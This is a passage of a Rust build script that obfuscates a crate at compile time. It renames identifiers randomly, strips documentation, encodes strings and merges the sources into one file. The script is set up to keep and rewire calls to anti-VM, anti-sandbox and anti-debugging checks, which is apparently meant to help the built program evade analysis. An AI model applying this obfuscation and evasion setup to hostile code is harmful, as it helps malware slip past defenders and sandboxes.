    for p in paths {
        if let Ok(src) = fs::read_to_string(p) {
            if let Ok(ast) = syn::parse_file(&src) {
                collect_osstr_vars_from_file(&ast, &mut preserved);
            }
        }
    }
    preserved
}

struct DocRemover;
impl VisitMut for DocRemover {
    fn visit_item_fn_mut(&mut self, i: &mut ItemFn) { remove_doc_attrs(&mut i.attrs); visit_mut::visit_item_fn_mut(self, i); }
    fn visit_item_struct_mut(&mut self, i: &mut syn::ItemStruct) { remove_doc_attrs(&mut i.attrs); visit_mut::visit_item_struct_mut(self, i); }
    fn visit_item_enum_mut(&mut self, i: &mut syn::ItemEnum) { remove_doc_attrs(&mut i.attrs); visit_mut::visit_item_enum_mut(self, i); }
    fn visit_item_static_mut(&mut self, i: &mut ItemStatic) { remove_doc_attrs(&mut i.attrs); visit_mut::visit_item_static_mut(self, i); }
    fn visit_item_const_mut(&mut self, i: &mut ItemConst) { remove_doc_attrs(&mut i.attrs); visit_mut::visit_item_const_mut(self, i); }
    fn visit_item_trait_mut(&mut self, i: &mut ItemTrait) { remove_doc_attrs(&mut i.attrs); visit_mut::visit_item_trait_mut(self, i); }
    fn visit_item_impl_mut(&mut self, i: &mut ItemImpl) { remove_doc_attrs(&mut i.attrs); visit_mut::visit_item_impl_mut(self, i); }
}

struct IdentCollector<'a> {
    names: &'a mut Vec<String>,
}

impl<'ast> Visit<'ast> for IdentCollector<'_> {
    fn visit_item_fn(&mut self, i: &'ast ItemFn) {
        self.names.push(i.sig.ident.to_string());
        visit::visit_item_fn(self, i);
    }
    fn visit_item_struct(&mut self, i: &'ast syn::ItemStruct) {
        self.names.push(i.ident.to_string());
        visit::visit_item_struct(self, i);
    }
    fn visit_item_enum(&mut self, i: &'ast syn::ItemEnum) {
        self.names.push(i.ident.to_string());
        visit::visit_item_enum(self, i);
    }
    fn visit_item_const(&mut self, i: &'ast ItemConst) {
        self.names.push(i.ident.to_string());
        visit::visit_item_const(self, i);
    }
    fn visit_item_static(&mut self, i: &'ast ItemStatic) {
        self.names.push(i.ident.to_string());
        visit::visit_item_static(self, i);
    }
    fn visit_item_trait(&mut self, i: &'ast ItemTrait) {
        self.names.push(i.ident.to_string());
        visit::visit_item_trait(self, i);
    }
    fn visit_item_mod(&mut self, i: &'ast syn::ItemMod) {
        self.names.push(i.ident.to_string());
        visit::visit_item_mod(self, i);
    }
    fn visit_impl_item_fn(&mut self, i: &'ast syn::ImplItemFn) {
        self.names.push(i.sig.ident.to_string());
        visit::visit_impl_item_fn(self, i);
    }
}

/// Robust, recursive identifier collector using syn parsing (replaces previous version).
fn collect_idents_from_sources(sources: &[std::path::PathBuf]) -> Vec<String> {
    let mut names = Vec::new();

    for path in sources {
        if let Ok(src) = fs::read_to_string(path) {
            match syn::parse_file(&src) {
                Ok(file) => {
                    let mut visitor = IdentCollector { names: &mut names };
                    visitor.visit_file(&file);
                }
                Err(e) => {
                    // fallback: try to capture top-level identifiers using regex (keeps build going)
                    let re_fallback = Regex::new(r"\b(fn|struct|enum|const|static|mod|trait)\s+([A-Za-z_][A-Za-z0-9_]*)").unwrap();
                    for cap in re_fallback.captures_iter(&src) {
                        if let Some(id) = cap.get(2) {
                            names.push(id.as_str().to_string());
                        }
                    }
                    println!("cargo:warning=Obf: parse failed for {:?}: {} — using fallback identifier capture", path, e);
                }
            }
        }
    }

    names.sort();
    names.dedup();
    names
}

fn flatten_use_tree_to_statements_global(tree: &syn::UseTree, current_path: String, stmts: &mut HashSet<String>) {
    match tree {
        syn::UseTree::Path(p) => {
            let next_path = if current_path.is_empty() {
                p.ident.to_string()
            } else {
                format!("{}::{}", current_path, p.ident)
            };
            flatten_use_tree_to_statements_global(&p.tree, next_path, stmts);
        }
        syn::UseTree::Name(n) => {
            let final_path = if n.ident == "self" {
                current_path
            } else if current_path.is_empty() {
                n.ident.to_string()
            } else {
                format!("{}::{}", current_path, n.ident)
            };
            if !final_path.is_empty() {
                 stmts.insert(format!("use {};", final_path));
            }
        }
        syn::UseTree::Rename(r) => {
            let final_path = if current_path.is_empty() {
                format!("{} as {}", r.ident, r.rename)
            } else {
                format!("{}::{} as {}", current_path, r.ident, r.rename)
            };
            stmts.insert(format!("use {};", final_path));
        }
        syn::UseTree::Glob(_) => {
            if !current_path.is_empty() {
                let final_path = format!("{}::*", current_path);
                stmts.insert(format!("use {};", final_path));
            }
        }
        syn::UseTree::Group(g) => {
            for tree in &g.items {
                flatten_use_tree_to_statements_global(tree, current_path.clone(), stmts);
            }
        }
    }
}

struct UseVisitor<'a> {
    stmts: &'a mut HashSet<String>,
}

impl<'ast> Visit<'ast> for UseVisitor<'_> {
    fn visit_item_use(&mut self, i: &'ast ItemUse) {
        flatten_use_tree_to_statements_global(&i.tree, String::new(), self.stmts);
    }
}


fn run_obfuscation() {
    generate_yaml_signatures(); 
    
    if env::var("SKIP_OBFUSCATION").is_ok() {
        println!("cargo:warning=Skipping obfuscation (SKIP_OBFUSCATION environment variable set)");
        return;
    }

    let src_dir_env = SRC_DIR.to_string();
    let src_path = Path::new(&src_dir_env);
    let out_path = Path::new(OUT_FILE);

    if !src_path.exists() {
        panic!("source directory '{}' does not exist. Adjust SRC_DIR in build.rs.", src_dir_env);
    }
    let mut sources = Vec::new();
    for entry in WalkDir::new(src_path).into_iter().filter_map(|e| e.ok()) {
        let p = entry.path();

        // skip anything outside src/ (safety)
        if !p.starts_with(src_path) {
            continue;
        }

        if p.is_file() && p.extension().and_then(|s| s.to_str()) == Some("rs") {
            let filename = p.file_name().and_then(|n| n.to_str()).unwrap_or("");

            // Always skip the output file and the build script itself.
            if filename == "obfuscated.rs" || filename == "build.rs" {
                continue;
            }
            
            // FIX: Correctly select entry point based on crate type.
            // If building a binary, skip lib.rs.
            // If building a library, skip main.rs.
            if !OBFUSCATE_AS_LIB { // Building a binary
                if filename == "lib.rs" {
                    continue;
                }
            } else { // Building a library
                if filename == "main.rs" {
                    continue;
                }
            }

            sources.push(p.to_owned());
            println!("cargo:rerun-if-changed={}", p.display());
        }
    }
        
    println!("cargo:warning=obfuscator: will write to {}", OUT_FILE);

    let mut need_gen = FORCE_REGEN;
    if !FORCE_REGEN {
        if let Ok(meta) = fs::metadata(out_path) {
            if let Ok(out_mtime) = meta.modified() {
                let mut newest_input = SystemTime::UNIX_EPOCH;
                let mut ok = true;
                for p in &sources {
                    match fs::metadata(p).and_then(|m| m.modified()) {
                        Ok(mtime) => { if mtime > newest_input { newest_input = mtime; } }
                        Err(_) => { ok = false; break; }
                    }
                }
                if ok && newest_input <= out_mtime { need_gen = false; }
            }
        }
    }

    if !need_gen {
        println!("cargo:warning=obfuscator: {} is up-to-date, skipping regeneration", out_path.display());
        return;
    }

    let mut declared = collect_idents_from_sources(&sources);

    if OBFUSCATE_AS_LIB {
        let mut preserve = HashSet::new();
        for path in &sources {
            if let Ok(src) = fs::read_to_string(path) {
                if let Ok(ast) = syn::parse_file(&src) {
                    for item in ast.items {
                        match item {
                            Item::Fn(f) => {
                                if is_visibility_public(&f.vis) || has_no_mangle(&f.attrs) || is_extern_c_fn(&f) || has_proc_macro_attr(&f.attrs) {
                                    preserve.insert(f.sig.ident.to_string());
                                }
                            }
                            Item::Struct(s) => if is_visibility_public(&s.vis) { preserve.insert(s.ident.to_string()); },
                            Item::Enum(e) => if is_visibility_public(&e.vis) { preserve.insert(e.ident.to_string()); },
                            Item::Const(c) => if is_visibility_public(&c.vis) { preserve.insert(c.ident.to_string()); },
                            Item::Static(st) => if is_visibility_public(&st.vis) { preserve.insert(st.ident.to_string()); },
                            Item::Mod(m) => if is_visibility_public(&m.vis) { preserve.insert(m.ident.to_string()); },
                            Item::Trait(t) => if is_visibility_public(&t.vis) { preserve.insert(t.ident.to_string()); },
                            _ => {}
                        }
                    }
                }
            }
        }
        declared.retain(|n| !preserve.contains(n));
    } else {
        if !declared.contains(&"main".to_string()) {
            declared.push("main".to_string());
        }
    }

    declared.sort();
    declared.dedup();

    println!("cargo:warning=Collected identifiers (sample): {:?}", declared.iter().take(10).collect::<Vec<_>>());
    println!("cargo:warning=Contains main: {}", declared.contains(&"main".to_string()));

    let mut seed = [0u8; 32];
    getrandom::fill(&mut seed).expect("getrandom::fill failed to obtain OS randomness for seed");
    let mut global_rng: StdRng = StdRng::from_seed(seed);

    let blocklist: HashSet<&str> = [
        "new", "default", "clone", "copy", "from", "into", "to_string", "expect",
        "as_ref", "as_mut", "iter", "next", "build", "run",
        // Common parameter/variable names that should not be obfuscated
        "s", "t", "data", "path", "name", "value", "key", "item", "x", "y", "z",
        "self", "Self", "buf", "buffer", "len", "size", "index", "i", "j", "k",
        "result", "output", "input", "src", "dst", "ptr", "addr",
        // Type names that shouldn't be obfuscated
        "Syscalls", "Lazy", "Params", // <-- FIX: Add "Params" to prevent inconsistent renaming
        // External crate function names - DO NOT OBFUSCATE
        "is_virtualized", "check_user_activity", "check_for_hooking",
        "check_processes", "check_artifacts", "check_uptime", "run_all_checks_hidden"
    ].iter().cloned().collect();

    let mut ident_map = HashMap::new();
    // preserve identifiers passed to OsStr::new / OsString::from so they are not renamed
    let preserve_osstr_vars: HashSet<String> = collect_osstr_vars_from_sources(&sources);

    let mut main_obf_name = None;

    if !OBFUSCATE_AS_LIB {
        let obf_name = random_ident(8, &mut global_rng);
        ident_map.insert("main".to_string(), obf_name.clone());
        main_obf_name = Some(obf_name.clone());
        println!("cargo:warning=Obfuscating main -> {}", obf_name);
    }
    
    for name in &declared {
        if name == "main" || blocklist.contains(name.as_str()) { continue; }
        
        // Skip single-letter variable names (likely parameters or loop counters)
        if name.len() == 1 {
            continue;
        }

        // skip any identifiers detected as OsStr/OsString arguments
        if preserve_osstr_vars.contains(name) {
            continue;
        }

        let new_name = random_ident(8, &mut global_rng);
        ident_map.insert(name.clone(), new_name);
    }

    let mut folder_seed = [0u8; 32];
    getrandom::fill(&mut folder_seed).expect("getrandom::fill failed to obtain folder seed");
    let folder_rng: StdRng = StdRng::from_seed(folder_seed);

    let mut decoder_name = format!("decode_{}", random_ident(12, &mut global_rng));
    while declared.contains(&decoder_name) {
        decoder_name = format!("decode_{}", random_ident(12, &mut global_rng));
    }

    let mut checksum_name = format!("checksum_{}", random_ident(12, &mut global_rng));
    while declared.contains(&checksum_name) || checksum_name == decoder_name {
        checksum_name = format!("checksum_{}", random_ident(12, &mut global_rng));
    }

    let mut folder = FullObfFold::new(ident_map, folder_rng.clone(), decoder_name.clone());
    
    let mut all_inner_attrs = HashSet::new();
    let mut combined_ts = quote! {};
    let mut module_declarations = Vec::new();
    
    for path in &sources {
        let mut raw_src = fs::read_to_string(path).unwrap_or_default();
        println!("cargo:warning=Processing file: {:?} (full path: {}), size: {}",
            path.file_name(), path.display(), raw_src.len());
        
        // FIX: The `use ...::*` statements bring these functions into the global scope
        // of the final `obfuscated.rs` file. We must call them directly without the crate prefix.
        raw_src = raw_src.replace("anti_vm::is_virtualized", "is_virtualized");
        raw_src = raw_src.replace("anti_sandbox::check_user_activity", "check_user_activity");
        raw_src = raw_src.replace("anti_sandbox::check_for_hooking", "check_for_hooking");
        raw_src = raw_src.replace("anti_sandbox::check_processes", "check_processes");
        raw_src = raw_src.replace("anti_sandbox::check_artifacts", "check_artifacts");
        // FIX: The compiler now sees `check_uptime` as returning a `bool`, so the `.unwrap_or(true)`
        // call was incorrect. This removes it, leaving just the function call.
        raw_src = raw_src.replace("anti_sandbox::check_uptime().unwrap_or(true)", "check_uptime()");
        raw_src = raw_src.replace("anti_debug_rust::run_all_checks_hidden", "run_all_checks_hidden");


        match syn::parse_file(&raw_src) {
            Ok(mut ast) => {
                let mut doc_remover = DocRemover;
                doc_remover.visit_file_mut(&mut ast);

                for attr in ast.attrs.drain(..) {
                    if !attr.path().is_ident("doc") {
                        all_inner_attrs.insert(attr.to_token_stream().to_string());
                    }
                }
                
                // Extract and *remove* module declarations (mod foo;) from the AST
                ast.items.retain(|item| {
                    if let Item::Mod(m) = item {
                        if m.content.is_none() {
                            // It's a module declaration. Collect it.
                            let mod_decl = format!("mod {};", m.ident);
                            module_declarations.push(mod_decl);
                            // And tell `retain` to drop it from `ast.items`.
                            return false;
                        }
                    }
                    // Keep all other items.
                    true
                });
                
                let folded = folder.fold_file(ast);
                combined_ts.extend(folded.into_token_stream());
            }
            Err(e) => {
                 println!("cargo:warning=Failed to parse file {:?}: {}. Skipping.", path, e);
            }
        }
    }

    let combined_code = combined_ts.to_string();
    
    println!("cargo:warning=Generated combined code (size: {})", combined_code.len());

    let mut final_use_stmts = HashSet::new();
    for path in &sources {
        if let Ok(raw_src) = fs::read_to_string(path) {
            if let Ok(ast) = syn::parse_file(&raw_src) {
                let mut visitor = UseVisitor { stmts: &mut final_use_stmts };
                visitor.visit_file(&ast);
            }
        }
    }

    let mut sorted_uses: Vec<String> = final_use_stmts.into_iter().collect();
    sorted_uses.sort();
    let use_code = sorted_uses.join("\n");

    let use_remover_regex = Regex::new(r"use\s+[^;]+?;").unwrap();
    let code_without_uses = use_remover_regex.replace_all(&combined_code, "").to_string();
    
    let decoder_fn = string_obfuscation::generate_decoder_function(&decoder_name, &checksum_name);
    
    // Generate main wrapper - search for what the original main function was renamed to
    let main_wrapper = if let Some(obf_main_name) = main_obf_name {
        // Search the combined code to verify the function exists
        let search_pattern = format!("fn {} (", obf_main_name);
        if code_without_uses.contains(&search_pattern) {
            println!("cargo:warning=Found obfuscated main function: {}", obf_main_name);
            format!("\nfn main() {{ {}(); }}", obf_main_name)
        } else {
            // Try without space
            let search_pattern2 = format!("fn {}(", obf_main_name);
            if code_without_uses.contains(&search_pattern2) {
                println!("cargo:warning=Found obfuscated main function: {}", obf_main_name);
                format!("\nfn main() {{ {}(); }}", obf_main_name)
            } else {
                println!("cargo:warning=WARNING: Could not find obfuscated main function {} in generated code!", obf_main_name);
                println!("cargo:warning=You may need to manually create a main() function that calls your entry point");
                String::new()
            }
        }
    } else {
        String::new()
    };

    let mut sorted_inner_attrs: Vec<_> = all_inner_attrs.into_iter().collect();
    sorted_inner_attrs.sort();
    
    // Deduplicate module declarations
    module_declarations.sort();
    module_declarations.dedup();
    let module_decls_code = module_declarations.join("\n");
    
    let mut final_code = format!(
        "{}\n{}\n{}\n\n{}\n\n{}{}",
        sorted_inner_attrs.join("\n"),
        module_decls_code,
        use_code,
        decoder_fn,
        code_without_uses,
        main_wrapper
    );

    // reduce long runs of blank lines to two
    let re_multi_blank = Regex::new(r"\n{3,}").unwrap();
    final_code = re_multi_blank.replace_all(&final_code, "\n\n").to_string();

    // ensure output directory exists, then write the file once
    if let Some(parent) = out_path.parent() {
        fs::create_dir_all(parent).expect("Failed to create output directory");
    }
    fs::write(out_path, &final_code).expect("failed to write obfuscated file");

    println!("cargo:warning=obfuscator: wrote obfuscated code to {}", out_path.display());
}

fn main() {
    // Spawn a new thread with a larger stack size to prevent stack overflows,
    // which can be an issue with deep recursion in syn/quote on some platforms.
    let builder = std::thread::Builder::new()
        .stack_size(32 * 1024 * 1024); // 32 MB stack

    let handler = builder.spawn(|| {
        run_obfuscation();
    }).unwrap();

    handler.join().unwrap();
}
